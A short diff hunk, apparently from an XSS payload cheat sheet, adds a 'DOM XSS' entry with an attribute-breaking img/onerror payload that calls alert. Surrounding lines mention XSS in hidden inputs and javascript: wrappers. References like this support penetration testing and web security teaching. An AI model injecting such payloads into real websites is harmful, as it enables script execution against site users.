@@ -83,6 +83,11 @@ XSS in Hidden input
 Use CTRL+SHIFT+X to trigger the onclick event
 ```
 
+DOM XSS
+```
+#"><img src=/ onerror=alert(2)>
+```
+
 ## XSS in wrappers javascript and data
 XSS with javascript:
 ```
